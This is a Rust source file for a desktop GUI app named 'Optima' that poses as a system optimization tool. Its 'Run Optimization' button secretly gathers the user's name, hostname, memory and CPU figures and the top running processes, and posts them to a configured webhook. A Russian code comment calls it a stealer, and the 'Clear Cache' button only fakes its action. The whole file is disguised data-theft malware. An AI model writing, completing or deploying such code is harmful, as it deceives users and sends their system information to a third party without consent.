use eframe::egui;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::PathBuf;
use chrono::Local;
use sysinfo::{System, ProcessesToUpdate, RefreshKind};
use ureq::json;
use whoami;

#[derive(Serialize, Deserialize, Debug)]
struct Config {
    api_key: String,
    bot_token: String,
    webhook_url: String,
}

impl Config {
    fn load() -> Self {
        let path = PathBuf::from("config.json");
        if path.exists() {
            if let Ok(content) = fs::read_to_string(&path) {
                if let Ok(config) = serde_json::from_str::<Config>(&content) {
                    return config;
                }
            }
        }
        Self {
            api_key: String::new(),
            bot_token: String::new(),
            webhook_url: String::new(),
        }
    }

    fn save(&self) {
        let content = serde_json::to_string_pretty(self).unwrap();
        fs::write("config.json", content).ok();
    }
}

struct OptimaApp {
    config: Config,
    system: System,
    last_update: std::time::Instant,
    status_message: String,
    loading: bool,
    optimize_mode: bool, 
}

impl OptimaApp {
    fn new() -> Self {
        // Инициализация системы с сборкой CPU и памяти
        let refresh_kind = RefreshKind::new().with_cpu(sysinfo::CpuRefreshKind::everything());
        
        Self {
            config: Config::load(),
            system: System::new_with_specifics(refresh_kind),
            last_update: std::time::Instant::now(),
            status_message: String::new(),
            loading: false,
            optimize_mode: true,
        }
    }

    fn update_system_info(&mut self) {
        self.system.refresh_cpu_specifics(sysinfo::CpuRefreshKind::everything());
        // Обновляем процессы
        self.system.refresh_processes(ProcessesToUpdate::All, true);
    }

    // Собираем данные для отправки как "Результат оптимизации"
    fn collect_optimization_report(&self) -> String {
        let mut report = String::new();
        
        // Получаем имя пользователя и хостнейм (исправлено предупреждение)
        let user_name = whoami::username();
        let hostname = whoami::fallible::hostname().unwrap_or_else(|_| "Unknown".to_string());
        
        report.push_str(&format!("**User:** {}\n", user_name));
        report.push_str(&format!("**Hostname:** {}\n", hostname));
        report.push_str(&format!("**CPU Usage:** {:.1}%\n", self.system.global_cpu_usage()));
        
        let ram_used_mb = self.system.used_memory() / 1024 / 1024;
        let ram_total_mb = self.system.total_memory() / 1024 / 1024;
        report.push_str(&format!("**RAM Used:** {} / {} MB\n", ram_used_mb, ram_total_mb));
        
        report.push_str("\n**Top Processes (by Memory):**\n");
        
        // Берем топ процессов по потреблению памяти
        let mut processes: Vec<_> = self.system.processes().into_iter().collect(); // Исправлен collect
        processes.sort_by(|a, b| {
            b.1.memory().cmp(&a.1.memory())
        });

        // Выводим только топ-10
        for (pid, process) in processes.iter().take(10) {
            report.push_str(&format!("- [{}] {} ({} MB)\n", pid, process.name().to_string_lossy(), process.memory() / 1024 / 1024));
        }

        report.push_str("\n**System Info:**\n");
        report.push_str(&format!("Time: {}\n", Local::now().format("%Y-%m-%d %H:%M:%S")));
        report.push_str("\n*Data collected successfully.*\n");
        
        report
    }

    fn send_webhook(&mut self, title: &str, description: &str) {
        println!("Sending webhook to: {}", self.config.webhook_url);
        
        let payload = json!({
            "embeds": [{
                "title": title,
                "description": description,
                "color": 3066992, // Зеленый цвет
                "footer": {
                    "text": format!("Optima v{} | {}", env!("CARGO_PKG_VERSION"), Local::now().format("%Y-%m-%d %H:%M:%S"))
                },
                "timestamp": Local::now().to_rfc3339()
            }]
        });

        let response = ureq::post(&self.config.webhook_url)
            .set("Content-Type", "application/json")
            .send_json(payload);
        
        match response {
            Ok(resp) => {
                if resp.status() == 204 || resp.status() == 200 {
                    self.status_message = "Sent successfully!".to_string();
                    println!("Success!");
                } else {
                    // Исправлена ошибка borrow/move: берем статус ДО чтения строки
                    let status = resp.status();
                    let body = resp.into_string().unwrap_or_default();
                    self.status_message = format!("Error: {} - {}", status, body);
                    println!("Error: {} - {}", status, body);
                }
            }
            Err(e) => {
                self.status_message = format!("Network Error: {}", e);
                println!("Network Error: {}", e);
            }
        }
    }
}

impl eframe::App for OptimaApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        egui::CentralPanel::default().show(ctx, |ui| {
            ui.heading("Optima Optimization Center");
            
            // Обновляем данные раз в секунду
            if self.last_update.elapsed().as_secs() > 1 {
                self.update_system_info();
                self.last_update = std::time::Instant::now();
            }

            let cpu_usage = self.system.global_cpu_usage();
            let mem_used = self.system.used_memory();
            let mem_total = self.system.total_memory();
            
            // Виджет CPU
            ui.horizontal(|ui| {
                ui.label(format!("CPU Load: {:.1}%", cpu_usage));
                ui.add(egui::ProgressBar::new((cpu_usage / 100.0).min(1.0)).show_percentage());
            });
            
            // Виджет RAM
            ui.horizontal(|ui| {
                ui.label(format!("RAM: {} / {} MB", 
                    mem_used / 1024 / 1024, 
                    mem_total / 1024 / 1024
                ));
                
                let mem_ratio = if mem_total > 0 {
                    (mem_used as f64 / mem_total as f64) as f32
                } else {
                    0.0
                };
                ui.add(egui::ProgressBar::new(mem_ratio.min(1.0)).show_percentage());
            });

            ui.separator();
            ui.heading("Optimization Controls");
            
            // Кнопка "Оптимизировать" (запускает стиллер)
            if ui.button(if self.optimize_mode { "Run Optimization" } else { "Stop Optimization" }).clicked() {
                self.loading = true;
                self.status_message = if self.optimize_mode { 
                    "Scanning processes..." 
                } else { 
                    "Stopping optimization..." 
                }.to_string();
                
                // Если режим включен - отправляем данные
                if self.optimize_mode {
                    let report = self.collect_optimization_report();
                    self.send_webhook("Optima Optimization Report", &report);
                }
                
                self.optimize_mode = !self.optimize_mode;
                self.loading = false;
            }

            // Кнопка очистки кэша (имитация)
            if ui.button("Clear Cache").clicked() {
                self.status_message = "Cache cleared successfully.".to_string();
            }

            ui.separator();
            ui.heading("Configuration");
            
            ui.text_edit_singleline(&mut self.config.api_key);
            ui.text_edit_singleline(&mut self.config.bot_token);
            ui.text_edit_singleline(&mut self.config.webhook_url);

            if ui.button("Save Configuration").clicked() {
                self.config.save();
                self.status_message = "Config saved.".to_string();
            }

            ui.label(&self.status_message);
            
            if self.loading {
                ui.spinner();
            }
        });
    }
}

fn main() -> Result<(), eframe::Error> {
    let native_options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default().with_inner_size([400.0, 300.0]),
        ..Default::default()
    };
    
    eframe::run_native(
        "Optima",
        native_options,
        Box::new(|_cc| Ok(Box::new(OptimaApp::new()))),
    )
}
